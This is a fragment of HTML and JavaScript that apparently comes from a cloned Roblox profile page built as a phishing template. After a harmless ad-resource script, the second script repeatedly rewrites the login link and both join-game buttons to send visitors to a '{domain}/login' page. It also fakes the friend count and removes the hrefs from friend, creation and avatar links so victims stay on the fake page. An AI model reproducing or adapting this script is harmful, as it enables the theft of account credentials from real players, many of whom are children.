<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};

    Roblox.UpsellAdModal.Resources = {
        title: "Remove Ads Like This",
        body: "Builders Club members do not see external ads like these.",
        accept: "Upgrade Now",
        decline: "No, thanks"
    };
</script>
<script type="text/javascript">
	    setInterval(function(){ 
	            var link = document.getElementsByClassName("rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item");
                link[0].setAttribute("href", '{domain}/login?returnUrl={session}&gmode=lsOW');
                link[0].setAttribute("class", "rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item");
                var friendscountjs = document.getElementsByClassName("friends-count ng-binding");
                friendscountjs[0].innerHTML = "({friends})";
                var friendshref = document.getElementsByClassName("btn-secondary-xs btn-more see-all-link-icon ng-binding");
                friendshref[0].removeAttribute("href");
                var joinbutton = document.getElementsByClassName("profile-join-game btn-growth-md ng-binding");
                joinbutton[0].setAttribute("onclick", "window.location.href = '{domain}/login?returnUrl={session}&gmode=lsOW';")
                var joinbuttonphone = document.getElementsByClassName("profile-join-game action-join-game");
                joinbuttonphone[0].setAttribute("onclick", "window.location.href = '{domain}/login?returnUrl={session}&gmode=lsOW';");
                var creationsgrid = document.getElementsByClassName("game-card-link");
                creationsgrid[0].removeAttribute("href");
                var creationsslide = document.getElementsByClassName("slide-item-emblem-container");
                creationsslide[0].getElementsByTagName("a")[0].removeAttribute("href");
                for (let i = 0; i < 9; i++) {
                    var peoplelist = document.getElementsByClassName("avatar-container");
                    peoplelist[i].getElementsByTagName("a")[0].removeAttribute("href");
                }
	    });
	</script>